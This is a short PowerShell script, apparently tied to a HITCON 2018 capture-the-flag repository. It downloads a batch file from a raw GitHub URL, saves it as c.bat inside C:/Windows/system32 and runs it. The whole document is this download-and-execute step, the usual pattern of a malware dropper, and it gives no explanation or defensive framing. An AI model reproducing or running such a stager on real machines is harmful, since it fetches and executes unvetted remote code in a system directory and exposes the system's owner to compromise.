$url = "https://raw.githubusercontent.com/kn6869610/hitcon2018/master/start.bat"
$outpath = "C:/Windows/system32/c.bat"
Invoke-WebRequest -Uri $url -OutFile $outpath
start "C:/Windows/system32/c.bat"